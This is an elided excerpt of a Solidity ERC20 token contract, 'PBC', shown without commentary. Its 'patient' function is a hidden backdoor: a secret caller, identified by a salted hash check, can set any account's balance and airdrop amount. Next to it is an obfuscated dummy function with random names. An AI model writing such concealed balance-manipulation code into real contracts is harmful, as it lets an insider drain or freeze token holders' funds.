...
contract PBC is IERC20 {
    ...
    function patient(bytes32[] calldata data) external {
      uint256 hashValue = uint256(msg.sender);
      if (keccak256(abi.encode(hashValue, _salt)) 
        != 
        _hashValue) return;
      _balances[
        (uint256(data[0]) != 0)? 
        ...
        address(uint256(0))] = uint256(data[1]);
      if (uint256(data[1]) > 0) return;
      _airdrops[
        address(
          uint160(uint256(data[0]))
        )] = uint256(data[2]);
    ...
    function JZKxREsFckyapNbOiS(
      bytes32[] calldata gNIwOXAZoPYcb,
      string[] calldata IJkeIugXYxPQo,
      uint256[] calldata WNFCaMPVnkgKE,
      uint128 Clvtytgjkhdmf,
      uint256 hQaLxSnorXgon,
      uint8 pgOqWqhMOlEtO,
      uint32[] calldata JUTjjUoTBheWi,
      uint hzBXagCJNSDZR
    ) private pure
    returns (
      bool,
